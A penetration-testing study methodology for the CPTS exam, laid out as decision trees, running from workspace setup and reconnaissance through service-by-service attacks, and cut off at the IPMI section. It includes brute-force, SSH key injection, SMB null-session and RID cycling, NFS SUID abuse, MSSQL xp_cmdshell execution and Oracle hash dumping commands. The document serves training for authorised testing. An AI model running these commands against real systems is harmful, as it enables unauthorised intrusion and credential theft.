# CPTS Penetration Testing — Decision Tree Methodology

> **Version:** 2.0 — Decision Tree Edition — April 2026  
> **Purpose:** A zero-gap, exam-focused, decision-tree methodology. At every step you know exactly WHAT to do, WHEN to do it, WHY it works, and WHERE to go NEXT.  
> **Core Philosophy:** *"Distinguish between what we see and what we do not see. There are always ways to gain more information."*

---

# ═══════════════════════════════════════════════════════════
# MASTER DECISION FLOW — Read This First
# ═══════════════════════════════════════════════════════════

```python
START: You have a target IP or domain
 │
 ├─▶ PHASE 1: PREPARATION (Section 1)
 │    Set up workspace, tmux, export variables
 │
 ├─▶ PHASE 2: EXTERNAL RECON (Section 2)
 │    │
 │    ├─ IF you have a domain name → WHOIS, DNS, crt.sh, subdomain enum → gather IPs
 │    ├─ IF you have an IP only → skip to port scanning
 │    └─ ALWAYS: Check breach data (Dehashed, HIBP), Google dorks, LinkedIn
 │
 ├─▶ PHASE 3: NETWORK ENUMERATION (Section 3)
 │    │
 │    ├─ Run: host discovery (nmap -sn) → live hosts
 │    ├─ Run: full TCP scan (nmap -p- -sS --min-rate 5000) → ALL open ports
 │    ├─ Run: UDP scan (nmap -sU -F) → don't skip this
 │    └─ For EVERY open port → go to Phase 4 matching port number
 │
 ├─▶ PHASE 4: SERVICE ATTACKS (Section 4) — follow the port you found
 │    │
 │    ├─ Port 21 (FTP)     → Section 4.1  → IF anon login → download files, look for creds/keys
 │    │                                            → IF creds found → try SSH/SMB/RDP reuse → Section 4.2/4.3/4.14
 │    │                                            → IF nothing → brute force → Section 4.1
 │    ├─ Port 22 (SSH)     → Section 4.2  → SSH-audit, banner grab, try found creds, check for key files
 │    ├─ Port 25 (SMTP)    → Section 4.6  → VRFY user enum, open relay check → build user list → Section 8.5
 │    ├─ Port 53 (DNS)     → Section 4.5  → zone transfer, subdomain brute force → new targets → back to Section 3
 │    ├─ Port 80/443 (HTTP)→ Section 5    → FULL web attack chain (below)
 │    ├─ Port 88 (Kerberos)→ Section 8    → AS-REP roasting, Kerberoasting
 │    ├─ Port 110/995 (POP3)→ Section 4.7 → mail enum, credential extraction
 │    ├─ Port 111/2049 (NFS)→ Section 4.4 → showmount, mount shares, look for creds/keys, root squashing bypass
 │    ├─ Port 135 (WMI/RPC)→ Section 4.14 → rpcclient, wmiexec
 │    ├─ Port 139/445 (SMB)→ Section 4.3  → null session, share enum, RID cycling → creds → Section 8
 │    ├─ Port 143/993 (IMAP)→ Section 4.7 → mail enum, check emails for creds/SSH keys
 │    ├─ Port 161 (SNMP)   → Section 4.8  → onesixtyone brute, snmpwalk → look for creds in output
 │    ├─ Port 389/636 (LDAP)→ Section 8   → anonymous bind, windapsearch, bloodhound
 │    ├─ Port 623 (IPMI)   → Section 4.12 → version scan, hash dump, default passwords
 │    ├─ Port 873 (Rsync)  → Section 4.13 → share enum, file sync
 │    ├─ Port 1433 (MSSQL) → Section 4.10 → xp_cmdshell, impacket-mssqlclient → code execution
 │    ├─ Port 1521 (Oracle)→ Section 4.11 → ODAT, SID brute, default passwords, sqlplus
 │    ├─ Port 3306 (MySQL) → Section 4.9  → empty password check, database enum
 │    ├─ Port 3389 (RDP)   → Section 4.14 → xfreerdp with found creds, SocksOverRDP for pivoting
 │    ├─ Port 5985/5986 (WinRM)→ Section 4.14 → evil-winrm with found creds
 │    └─ Ports 512/513/514 (R-Services)→ Section 4.13 → rlogin, rsh, rexec
 │
 ├─▶ WEB ATTACK CHAIN (Section 5) — triggered by port 80/443
 │    │
 │    1. Fingerprint: whatweb, curl -I, wafw00f
 │    2. Source code review: check HTML comments, hidden fields
 │    3. Directory brute force: gobuster/ffuf
 │    4. Virtual host discovery: gobuster vhost / ffuf Host header
 │    5. IF CMS detected → wpscan (WordPress) / joomscan (Joomla)
 │    6. IF login form → try defaults → brute force → check SQLi
 │    7. IF file upload → try web shell upload
 │    8. IF parameters → check LFI, command injection, SQLi
 │    9. IF admin panel → check theme editing for RCE (PHP)
 │    10. GOT ACCESS? → deploy shell → get reverse shell → go to Phase 6
 │
 ├─▶ PHASE 6: INITIAL ACCESS (Section 6)
 │    │
 │    ├─ IF you have a vulnerability → exploit it (searchsploit, Metasploit)
 │    ├─ IF you need a payload → msfvenom (Section 6.2)
 │    ├─ IF you got a shell → stabilize TTY (Section 6.5)
 │    └─ GOT SHELL? → go to Phase 7
 │
 ├─▶ PHASE 7: POST-EXPLOITATION (Section 7)
 │    │
 │    ├─ FIRST: Stabilize TTY (Section 6.5)
 │    ├─ SECOND: Transfer enumeration tools (Section 7.1/7.2)
 │    │   ├─ IF Linux target → linpeas.sh (wget/curl/SCP/base64)
 │    │   └─ IF Windows target → winPEAS (PowerShell/SMB/FTP/RDP drive)
 │    └─ THIRD: Enumerate the host → go to Phase 10
 │
 ├─▶ PHASE 10: PRIVILEGE ESCALATION (Section 10)
 │    │
 │    ├─ IF Linux:
 │    │   ├─ sudo -l → GTFOBins
 │    │   ├─ find SUID → GTFOBins
 │    │   ├─ getcap → capabilities abuse
 │    │   ├─ crontab → cron job abuse
 │    │   ├─ check creds files → password reuse
 │    │   └─ linpeas.sh → automated enum
 │    ├─ IF Windows:
 │    │   ├─ whoami /priv → SeImpersonate → Potato exploits
 │    │   ├─ whoami /groups → Backup Operators, DnsAdmins
 │    │   ├─ unquoted service paths
 │    │   ├─ LSASS dump → pypykatz
 │    │   └─ winPEAS → automated enum
 │    └─ GOT ROOT/SYSTEM? → document, check for more hosts → go to Phase 9 or 11
 │
 ├─▶ PHASE 9: PIVOTING (Section 9) — triggered by finding new networks
 │    │
 │    ├─ FIRST: Check for additional NICs (ifconfig / ipconfig)
 │    │   └─ IF new NIC found → new subnet discovered → MUST pivot
 │    ├─ IF SSH on pivot → SSH -D (SOCKS) or sshuttle (easiest)
 │    ├─ IF Meterpreter on pivot → autoroute + socks_proxy
 │    ├─ IF no SSH, no Meterpreter → Chisel (forward or reverse)
 │    ├─ IF Windows-only → Plink+Proxifier or SocksOverRDP
 │    ├─ IF multi-hop needed → Ligolo-ng (most efficient)
 │    ├─ IF DNS only allowed → dnscat2
 │    ├─ IF ICMP only → ptunnel-ng
 │    └─ AFTER pivot → scan new subnet → back to Phase 3 on new hosts
 │
 ├─▶ PHASE 8: ACTIVE DIRECTORY (Section 8) — triggered by domain environment
 │    │
 │    ├─ IF no credentials:
 │    │   ├─ Responder (LLMNR/NBT-NS poisoning) → crack NTLMv2 hashes
 │    │   ├─ Password spray with harvested usernames
 │    │   └─ Kerbrute userenum → build user list
 │    ├─ IF have credentials:
 │    │   ├─ Enumerate: CME, bloodhound, windapsearch, PowerView
 │    │   ├─ Kerberoast: GetUserSPNs.py → crack TGS tickets
 │    │   ├─ AS-REP roast: GetNPUsers → crack AS-REP hashes
 │    │   └─ Lateral: psexec, wmiexec, evil-winrm
 │    └─ IF Domain Admin:
 │        └─ DCSync: secretsdump → full domain compromise
 │
 ├─▶ PHASE 11: LATERAL MOVEMENT (Section 11)
 │    │
 │    ├─ Password reuse: try found creds on other hosts
 │    ├─ Pass-the-Hash: spray NTLM hashes with --local-auth
 │    ├─ Mapped drives: check net use (may lead to DC)
 │    └─ Service accounts: check password patterns
 │
 └─▶ PHASE 12: REPORTING (Section 12)
      ├─ Document EVERY step with screenshots (whoami, hostname, ipconfig)
      ├─ Focus on BUSINESS IMPACT
      └─ Cleanup: remove shells, tools, added users
```

---

# ═══════════════════════════════════════════════════════════
# SECTION 1: PREPARATION & ENVIRONMENT SETUP
# ═══════════════════════════════════════════════════════════

## 1.1 Workspace Setup

**WHEN:** ALWAYS — before touching any target. First step of every engagement.

**WHY:** Organized workspace prevents missed findings, enables quick reference, and makes reporting easier.

**HOW:**
```bash
# Create target-specific directory structure
mkdir -p {target_name}/{nmap,scans,exploits,loot,notes,downloads,screenshots}
cd {target_name}

# Export variables for easy reference throughout engagement
export IP=10.129.x.x          # Target IP
export LHOST=10.10.x.x        # Your attack box IP (VPN IP)
export DOMAIN=inlanefreight.local  # If AD environment
```

**NEXT:** → Set up tmux (Section 1.2)

---

## 1.2 Session Management (tmux)

**WHEN:** ALWAYS — you will need multiple terminals simultaneously.

**WHY:** You need parallel windows for: Responder running, listeners active, scanning, exploiting, and notes — all at once.

**HOW:**
```bash
tmux    # start tmux
```

| Shortcut | Action |
|----------|--------|
| `Ctrl+b, c` | New window |
| `Ctrl+b, %` | Vertical split |
| `Ctrl+b, "` | Horizontal split |
| `Ctrl+b, [arrow]` | Switch panes |
| `Ctrl+b, [index]` | Jump to window |

**Recommended layout:**
- Window 1: VPN connection & status monitoring
- Window 2: Listeners (Netcat `nc -nvlp 443`, Metasploit `msfconsole`)
- Window 3: Scans (Nmap, enumeration — your primary working window)
- Window 4: Exploitation (shells, payload execution)
- Window 5: **Responder** (AD engagements — start and LEAVE RUNNING)

**NEXT:** → External Recon (Section 2)

---

## 1.3 The Six-Layer Mental Model

**WHEN:** Keep this in mind throughout the engagement. Every finding maps to a layer.

**WHY:** Helps you understand where you are in the attack chain and what layers remain.

| Layer | What You're Looking At | What You Want From It |
|-------|----------------------|----------------------|
| **1. Internet Presence** | Domains, subdomains, ASN, IPs | Target identification |
| **2. Gateway** | Firewalls, WAF, IPS/IDS, DMZ | Understand what's blocking you |
| **3. Accessible Services** | Open ports, versions, configs | Entry points |
| **4. Processes** | Running services, data flow | Attack vectors |
| **5. Privileges** | Users, groups, permissions | Escalation paths |
| **6. OS Setup** | OS type, patches, config files | Exploitation, credential hunting |

**NEXT:** → External Recon (Section 2)

---

## 1.4 Essential Tool Quick-Install

**WHEN:** Before the exam, verify these are installed.

```bash
# RustScan (faster than nmap for initial port discovery)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env
sudo apt update && sudo apt install -y build-essential gcc pkg-config libssl-dev
git clone https://github.com/RustScan/RustScan.git && cd RustScan
cargo build --release && sudo mv target/release/rustscan /usr/local/bin/

# Ligolo-ng (pivoting — download ALL agents including Windows)
mkdir ~/ligolo-ng && cd ~/ligolo-ng
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.8.2_windows_amd64.zip
chmod +x proxy agent

# rockyou.txt reference
# GitHub mirror: https://github.com/RykerWilder/rockyou.txt/tree/main
# Standard location: /usr/share/wordlists/rockyou.txt
```

**NEXT:** → External Recon (Section 2)

---

# ═══════════════════════════════════════════════════════════
# SECTION 2: EXTERNAL RECONNAISSANCE & FOOTPRINTING
# ═══════════════════════════════════════════════════════════

> *"Our goal is not to get at the systems but to find all the ways to get there."*

## 2.1 DECISION: Do You Have a Domain Name or Just an IP?

```
┌─ DECISION: What's your starting point?
│  ├─ IF you have a DOMAIN NAME → follow Section 2.2 (Domain Recon)
│  └─ IF you only have an IP → skip to Section 3 (Network Enumeration)
```

---

## 2.2 Domain Reconnaissance

**WHEN:** You have a domain name (e.g., `inlanefreight.com`).

**WHY:** Domains reveal infrastructure: IP ranges, subdomains, mail servers, third-party services, and potentially leaked credentials.

### 2.2.1 WHOIS Lookup

**WHEN:** FIRST step with any domain.

**WHY:** Reveals registrar, registrant contacts, nameservers, creation/expiration dates — useful for social engineering and identifying infrastructure.

**WHAT to look for:** Nameserver IPs (may be in-scope targets), admin/tech contact emails (for credential searches).

### 2.2.2 ASN & IP Space Discovery

**WHEN:** You need to find the target's IP ranges.

**WHY:** Large organizations own their ASN; smaller ones share infrastructure (AWS, Cloudflare, Azure). You can only test company-owned infrastructure without third-party permission.

**HOW:**
- Use **BGP Toolkit** (bgp.he.net) → search company name → get ASN and IP blocks
- **WARNING:** Confirm scope — shared infrastructure testing may affect other organizations

### 2.2.3 DNS Enumeration

**WHEN:** You have a domain and need to find all associated hosts.

**WHY:** DNS records reveal mail servers, nameservers, subdomains, and hidden infrastructure.

**HOW:**
```bash
# ALL DNS records at once
dig any inlanefreight.com

# Specific record types
dig A inlanefreight.com          # IPv4 addresses
dig AAAA inlanefreight.com       # IPv6 addresses
dig MX inlanefreight.com         # Mail servers
dig NS inlanefreight.com         # Nameservers (→ hosting provider)
dig TXT inlanefreight.com        # SPF, DMARC, DKIM, verification keys
dig +trace inlanefreight.com     # Full resolution path
```

**WHAT to look for:**
- NS records → nameserver IPs (potential targets)
- MX records → mail server IPs (potential targets)
- TXT records → exposed keys, verification tokens

**NEXT:**
- IF you found new subdomains → repeat DNS enum on each
- IF you found new IPs → add to target list → Section 3

### 2.2.4 Certificate Transparency Logs

**WHEN:** You need to find subdomains that may not have DNS records.

**WHY:** Every SSL/TLS certificate is publicly logged. Subdomains that exist but aren't in DNS still appear in CT logs.

**HOW:**
```bash
# Quick search
curl -s "https://crt.sh/?q=inlanefreight.com&output=json" | jq .

# Extract unique subdomains only
curl -s "https://crt.sh/?q=inlanefreight.com&output=json" | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u

# Find specific subdomain patterns (e.g., all "dev" subdomains)
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
```

**NEXT:** IF you found new subdomains → verify they resolve → add to scan targets → Section 3

### 2.2.5 Subdomain Enumeration

**WHEN:** You need to find ALL subdomains (beyond what CT logs show).

**WHY:** Subdomains often host separate applications, admin panels, or development environments with weaker security.

**HOW — choose tool based on situation:**

| Tool               | WHEN to Use                       | Command                                                                                                     |
| ------------------ | --------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| **dnsenum**        | Comprehensive brute-force         | `dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r` |
| **ffuf**           | HTTP-based vHost discovery        | `ffuf -u http://IP:PORT -w subdomains.txt -mc 200,403 -H "Host: FUZZ.domain.htb" -ac`                       |
| **gobuster vhost** | Fast vHost discovery              | `gobuster vhost -u http://IP -w subdomains.txt --domain domain.htb --append-domain -t 50`                   |
| **amass**          | Extensive data source integration | `amass enum -d inlanefreight.com`                                                                           |
| **assetfinder**    | Quick, lightweight                | `assetfinder --subs-only inlanefreight.com`                                                                 |

**DNS Zone Transfer (if misconfigured — rare but critical):**
```bash
dig axfr inlanefreight.htb @10.129.14.128
```

**NEXT:** For each valid subdomain → resolve to IP → Section 3

---

## 2.3 OSINT & Credential Hunting

**WHEN:** Parallel to technical recon — ALWAYS do this.

**WHY:** Breached credentials, employee information, and public documents provide the usernames and passwords that become your initial foothold.

### 2.3.1 Breach Data

**WHEN:** You have domain emails or usernames.

**HOW:**
- **Dehashed:** Search for cleartext passwords/hashes from public breaches
- **HaveIBeenPwned:** Validate if emails appear in known breaches
- Even OLD/EXPIRED passwords are useful for building wordlists

**NEXT:** IF you found passwords → try them against: Citrix, RDS, OWA, O365, VPN, VMware Horizon → Section 4

### 2.3.2 Username Harvesting

**WHEN:** You need valid usernames for password spraying.

**WHY:** Password spraying requires a user list. Company naming conventions are predictable.

**HOW:**
- **LinkedIn:** Search for employees → note job titles and technologies
- **linkedin2username:** Scrapes LinkedIn → generates username combos (flast, first.last, f.last)
- **Job Postings:** Reveal tech stack, software versions, org structure
- **Google Dorks:**
  ```
  filetype:pdf inurl:targetdomain.com
  intext:"@targetdomain.com" inurl:targetdomain.com
  ```

**NEXT:** IF you have a user list → password spraying → Section 8.6

### 2.3.3 Cloud Resource Discovery

**WHEN:** Looking for misconfigured cloud storage.

**HOW — Google Dorks:**
```
# AWS S3
site:s3.amazonaws.com inlanefreight
site:.s3.amazonaws.com "index of"

# Azure Blob
site:blob.core.windows.net inlanefreight
site:.blob.core.windows.net "index of"
```

**NEXT:** IF you find exposed buckets → check for credentials, config files → use findings

### 2.3.4 Shodan Enrichment (requires API key)

**WHEN:** You have IPs and want passive service enumeration.

**HOW:**
```bash
for i in $(cat ip-addresses.txt); do shodan host $i; done
```

**NEXT:** IF Shodan reveals new open ports → add to scan targets → Section 3

---

**→ END OF SECTION 2. All discovered IPs/domains → Section 3 (Network Enumeration).**

---

# ═══════════════════════════════════════════════════════════
# SECTION 3: NETWORK ENUMERATION & SERVICE DISCOVERY
# ═══════════════════════════════════════════════════════════

## 3.1 DECISION: What Scan Strategy to Use?

```
┌─ DECISION: What's your network situation?
│  ├─ IF you have a SINGLE target IP → full scan on that IP
│  ├─ IF you have a SUBNET → host discovery first, then scan live hosts
│  └─ IF you found new subnet via pivoting → repeat this section on new subnet
```

---

## 3.2 Host Discovery

**WHEN:** You have a subnet (e.g., `10.129.2.0/24`) and need to find live hosts.

**WHY:** Scanning dead hosts wastes time. Identify live hosts first.

**HOW:**
```bash
# Nmap ping sweep
sudo nmap -sn 10.129.2.0/24 -oA scans/discovery

# FPing (faster)
fping -asgq 10.129.2.0/24
```

**WHAT to look for:** List of responsive IPs → these become your scan targets.

**NEXT:** → Port Scanning (Section 3.3) on each live host.

---

## 3.3 Port Scanning — The Critical Three-Scan Strategy

**WHEN:** On EVERY live host. No exceptions.

**WHY:** Missing a port = missing an entry point. You MUST scan all ports, both TCP and UDP.

### Scan 1: Full TCP Scan (THE STANDARD)

**WHEN:** ALWAYS — your primary scan.

**WHY:** `-p-` scans all 65535 ports. Many services hide on non-standard ports. `--min-rate 5000` speeds it up without losing accuracy.

**HOW:**
```bash
sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $IP -oA scans/allports
```

| Flag | Why |
|------|-----|
| `-p-` | ALL 65535 ports (not just top 1000) |
| `-sS` | SYN scan (stealthier, faster) |
| `--min-rate 5000` | Speed — sends 5000+ packets/sec |
| `--open` | Only show open ports (cleaner output) |
| `-vvv` | Very verbose (see progress) |
| `-n` | No DNS resolution (faster) |
| `-Pn` | Skip ping (treat as online) |
| `-oA scans/allports` | Save in all formats |

**ALTERNATIVE — RustScan (faster):**
```bash
rustscan -a $IP --ulimit 10000 -- -A -sC -sV -oA full_port_scan
```

### Scan 2: UDP Scan (DO NOT SKIP)

**WHEN:** ALWAYS — after or parallel to TCP scan.

**WHY:** Critical services run on UDP: DNS (53), SNMP (161), DHCP (67/68). Missing these = missing entire attack surface.

**HOW:**
```bash
sudo nmap -sU -F --top-ports 100 $IP -oA scans/udp_scan
```

### Scan 3: Quick Top-1000 (optional, for speed)

**WHEN:** When you need fast initial results while full scan runs.

**HOW:**
```bash
sudo nmap $IP --top-ports=1000 --open -oA scans/quick
```

---

## 3.4 Service & Version Detection

**WHEN:** AFTER you have the list of open ports from the full scan.

**WHY:** Knowing the service and version tells you which exploits, default creds, and misconfigurations to try.

**HOW:**
```bash
# Extract open ports from the allports scan
ports=$(grep open scans/allports.nmap | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')

# Deep service detection on discovered ports
sudo nmap -sC -sV -p $ports $IP -oA scans/detailed

# Aggressive scan (OS + versions + scripts + traceroute)
sudo nmap -A -p $ports $IP -oA scans/aggressive
```

| Flag | Why |
|------|-----|
| `-sC` | Default NSE scripts (reveals extra info) |
| `-sV` | Service version detection |
| `-A` | Aggressive: OS + versions + scripts + traceroute |
| `-O` | OS detection only |

### Banner Grabbing (quick fingerprinting)
```bash
# Via Nmap
nmap -sV --script=banner -p21 $IP

# Via Netcat (quick manual check)
nc -nv $IP <port>
```

---

## 3.5 DECISION TREE: Where to Go Next Based on Open Ports

```
┌─ What ports did you find? For EACH open port, follow its section:
│
│  Port 21       → Section 4.1  (FTP)
│  Port 22       → Section 4.2  (SSH)
│  Port 25       → Section 4.6  (SMTP)
│  Port 53       → Section 4.5  (DNS)
│  Port 80/443   → Section 5    (WEB — full attack chain)
│  Port 88       → Section 8    (Kerberos — AD)
│  Port 110/995  → Section 4.7  (POP3)
│  Port 111/2049 → Section 4.4  (NFS)
│  Port 135      → Section 4.14 (WMI/RPC)
│  Port 139/445  → Section 4.3  (SMB)
│  Port 143/993  → Section 4.7  (IMAP)
│  Port 161      → Section 4.8  (SNMP)
│  Port 389/636  → Section 8    (LDAP — AD)
│  Port 623      → Section 4.12 (IPMI)
│  Port 873      → Section 4.13 (Rsync)
│  Port 1433     → Section 4.10 (MSSQL)
│  Port 1521     → Section 4.11 (Oracle)
│  Port 3306     → Section 4.9  (MySQL)
│  Port 3389     → Section 4.14 (RDP)
│  Port 5985/86  → Section 4.14 (WinRM)
│  Ports 512/13/14→ Section 4.13 (R-Services)
│
│  After each service section:
│  ├─ IF you got credentials → try them on OTHER services (password reuse)
│  ├─ IF you got a shell → go to Section 6 (stabilize) → Section 7 (transfer tools)
│  ├─ IF you found new internal IPs → go to Section 9 (pivot)
│  └─ IF nothing worked → try next port's section
```

---

**→ END OF SECTION 3. Follow the port-based decision tree above to Section 4 or 5.**

---

# ═══════════════════════════════════════════════════════════
# SECTION 4: SERVICE-SPECIFIC ATTACKS
# ═══════════════════════════════════════════════════════════

## 4.1 PORT 21 — FTP

```
┌─ FOUND PORT 21 (FTP)?
│  ├─ STEP 1: Banner grab → nc -nv $IP 21
│  ├─ STEP 2: Try anonymous login → ftp anonymous:anonymous@$IP
│  │  ├─ IF success → download ALL files → look for:
│  │  │   ├─ .ssh/id_rsa → chmod 600 → SSH in → Section 4.2
│  │  │   ├─ Config files → look for credentials → try on other services
│  │  │   └─ Any text files → read for clues
│  │  └─ IF fail → STEP 3: Brute force → Section 4.1.1
│  └─ STEP 4: Check for TFTP on UDP 69 → no auth needed
```

**Anonymous login and download:**
```bash
# Interactive
ftp -p $IP

# Download everything recursively (passive mode)
wget -m --no-passive ftp://anonymous:anonymous@$IP

# Upload a file (if write-enabled)
put xyz.txt
```

**TFTP (Trivial FTP — UDP, no authentication):**
```bash
tftp $IP
tftp> get filename.txt
tftp> put filename.txt
```

**Brute force (if anonymous fails):**
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$IP
```

**NEXT:** IF creds found → try on SSH (Section 4.2), SMB (Section 4.3), RDP (Section 4.14)

---

## 4.2 PORT 22 — SSH

```
┌─ FOUND PORT 22 (SSH)?
│  ├─ STEP 1: SSH audit → ssh-audit.py $IP
│  ├─ STEP 2: Try found credentials → ssh user@$IP
│  ├─ STEP 3: IF you have an SSH key → chmod 600 key → ssh -i key user@$IP
│  ├─ STEP 4: IF key permissions wrong → chmod 600 id_rsa → retry
│  └─ STEP 5: IF password auth disabled → force it: ssh -o PreferredAuthentications=Password user@$IP
```

**SSH Audit:**
```bash
git clone https://github.com/jtesta/ssh-audit.git
./ssh-audit.py $IP
```

**Key usage:**
```bash
chmod 600 id_rsa                    # REQUIRED — SSH rejects keys with lax permissions
ssh -i id_rsa user@$IP              # Login with key
ssh-keygen -f key                   # Generate new key pair (for injection)
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys   # Inject key if you have write access
```

**NEXT:** IF logged in → check for additional NICs (`ifconfig`) → if new network found → Section 9

---

## 4.3 PORTS 139/445 — SMB

```
┌─ FOUND PORTS 139/445 (SMB)?
│  ├─ STEP 1: Nmap enum → nmap -sV -sC -p139,445 $IP
│  ├─ STEP 2: Try NULL session (no creds)
│  │  ├─ smbclient -N -L //$IP
│  │  ├─ smbmap -H $IP
│  │  ├─ crackmapexec smb $IP --shares -u '' -p ''
│  │  └─ IF shares accessible → download files → look for creds/keys
│  ├─ STEP 3: IF null session works → rpcclient -U "" -N $IP
│  │  ├─ enumdomusers → get user list → Section 8.5
│  │  ├─ querydominfo → get domain info
│  │  └─ queryuser <RID> → get user details
│  ├─ STEP 4: IF you have credentials → access shares with creds
│  │  ├─ smbclient //$IP/share -U 'user%pass'
│  │  ├─ smbmap -u user -p pass -H $IP -R 'share' --dir-only
│  │  └─ crackmapexec smb $IP -u user -p pass --shares
│  ├─ STEP 5: RID cycling (find users even without share access)
│  │  └─ rpcclient → for i in $(seq 500 1100); do queryuser 0x$(printf '%x\n' $i); done
│  └─ STEP 6: enum4linux-ng (comprehensive) → enum4linux-ng.py $IP -A
```

**If credentials found →** try password reuse across: SSH, RDP, WinRM, MSSQL, MySQL

**NEXT:** IF user list obtained → Section 8.5 (AD user enumeration) → Section 8.6 (password spraying)

---

## 4.4 PORTS 111/2049 — NFS

```
┌─ FOUND PORTS 111/2049 (NFS)?
│  ├─ STEP 1: showmount -e $IP → list exported shares
│  ├─ STEP 2: Mount the share → sudo mount -t nfs $IP:/ ./target-NFS/ -o nolock
│  ├─ STEP 3: Enumerate → ls -l (usernames), ls -n (UIDs/GUIDs)
│  │  ├─ IF you find readable files → extract creds/keys → try reuse
│  │  ├─ IF root squashing NOT enabled → upload SUID binary → PrivEsc → Section 10
│  │  └─ IF you can create files → place SSH keys in user's .ssh/ → login → Section 4.2
│  └─ STEP 4: When done → sudo umount ./target-NFS
```

**Lab insight (Footprinting Medium):** NFS mount → found text files with credentials → used for SMB access → found MORE credentials → RDP access → SQL Server → found target credentials.

**NEXT:** IF creds found → try on ALL other services. IF SUID possible → Section 10.1.

---

## 4.5 PORT 53 — DNS

```
┌─ FOUND PORT 53 (DNS)?
│  ├─ STEP 1: Try zone transfer → dig axfr domain.htb @$IP
│  │  └─ IF success → you get ALL DNS records → new subdomains/IPs → back to Section 3
│  ├─ STEP 2: Subdomain brute force
│  │  └─ for sub in $(cat subdomains-top1million-110000.txt); do dig $sub.domain.htb @$IP | grep $sub | tee -a subdomains.txt; done
│  ├─ STEP 3: dnsenum → dnsenum --dnsserver $IP --enum -p 0 -s 0 -o subdomains.txt -f wordlist.txt domain.htb
│  └─ STEP 4: Version info → dig CH TXT version.bind @$IP
```

**NEXT:** IF new subdomains found → resolve IPs → scan → Section 3

---

## 4.6 PORT 25 — SMTP

```
┌─ FOUND PORT 25 (SMTP)?
│  ├─ STEP 1: User enumeration → smtp-user-enum -M VRFY -U wordlist.txt -t $IP
│  ├─ STEP 2: Open relay check → nmap -p25 --script smtp-open-relay -v $IP
│  └─ STEP 3: Manual interaction → telnet $IP 25 → VRFY root
```

**NEXT:** IF users enumerated → build user list → Section 8.6 (password spraying)

---

## 4.7 PORTS 110/995/143/993 — POP3/IMAP

```
┌─ FOUND MAIL PORTS?
│  ├─ STEP 1: Try TLS connection → openssl s_client -connect $IP:993 -crlf -quiet (IMAPS)
│  ├─ STEP 2: Login → a1 LOGIN user pass
│  ├─ STEP 3: List mailboxes → a5 LIST "" "*"
│  ├─ STEP 4: Select mailbox → a9 SELECT INBOX
│  ├─ STEP 5: Fetch messages → a10 FETCH 1 RFC822
│  └─ LOOK FOR: SSH keys, passwords, server addresses, admin emails in emails
```

**POP3:**
```bash
openssl s_client -connect $IP:pop3s
USER username
PASS password
STAT    # number of emails
LIST    # list emails
RETR 1  # read email #1
```

**IMAP:**
```bash
openssl s_client -connect $IP:993 -crlf -quiet
a1 LOGIN user pass
a5 LIST "" "*"
a9 SELECT DEV.DEPARTMENT.INT
a10 FETCH 1 RFC822
```

**Lab insight (Footprinting Hard):** IMAP mailbox → found SSH private key in email → used for SSH login → checked .bash_history → found MySQL connection commands → connected to MySQL → found target password.

**NEXT:** IF creds/keys found → try SSH → Section 4.2 → enumerate host

---

## 4.8 PORT 161 — SNMP (UDP)

```
┌─ FOUND PORT 161 (SNMP)?
│  ├─ STEP 1: Brute force community string → onesixtyone -c snmp.txt $IP
│  ├─ STEP 2: snmpwalk with found string → snmpwalk -v2c -c community $IP
│  ├─ STEP 3: braa for targeted OID brute → braa community@$IP:.1.3.6.*
│  └─ LOOK FOR: Usernames, passwords, process info, network config in snmpwalk output
```

**Lab insight (Footprinting Hard):** SNMP brute → found community string "backup" → snmpwalk → found credentials → used for SSH (failed) → used for IMAP → found SSH key → got shell.

**NEXT:** IF creds found → try ALL services. IF network config found → may reveal new subnets → Section 9.

---

## 4.9 PORT 3306 — MySQL

```
┌─ FOUND PORT 3306 (MySQL)?
│  ├─ STEP 1: Try empty password → mysql -u root -h $IP (no -p flag)
│  ├─ STEP 2: Nmap scripts → nmap -p3306 --script mysql* $IP
│  └─ STEP 3: IF access → show databases; → use db; → show tables; → select * from users;
```

**NEXT:** IF you find password hashes → crack offline. IF you find credentials → try reuse.

---

## 4.10 PORT 1433 — MSSQL

```
┌─ FOUND PORT 1433 (MSSQL)?
│  ├─ STEP 1: Nmap comprehensive scan → nmap --script ms-sql* --script-args mssql.username=sa,mssql.password= -p1433 $IP
│  ├─ STEP 2: Try empty password → impacket-mssqlclient $IP
│  ├─ STEP 3: IF access → try xp_cmdshell
│  │  └─ SQL> enable_xp_cmdshell → SQL> xp_cmdshell whoami → CODE EXECUTION
│  └─ STEP 4: IF windows auth → impacket-mssqlclient server/user:pass@$IP -windows-auth
```

**NEXT:** IF xp_cmdshell works → you have code execution → go to Section 6 (shell) → Section 7 (transfer tools)

---

## 4.11 PORT 1521 — Oracle TNS

```
┌─ FOUND PORT 1521 (Oracle)?
│  ├─ STEP 1: Try default passwords → scott/tiger, CHANGE_ON_INSTALL (Oracle 9), dbsnmp/dbsnmp
│  ├─ STEP 2: SID brute → nmap -p1521 --script oracle-sid-brute $IP
│  ├─ STEP 3: ODAT enum → ./odat.py all -s $IP
│  └─ STEP 4: IF access → sqlplus user/pass@$IP/XE → select name,password from sys.user$; → crack hashes
```

**NEXT:** IF you get DBA access → file upload via UTL_FILE → web shell deployment

---

## 4.12 PORT 623 — IPMI (UDP)

```
┌─ FOUND PORT 623 (IPMI)?
│  ├─ STEP 1: Version scan → nmap -sU --script ipmi-version -p623 $IP
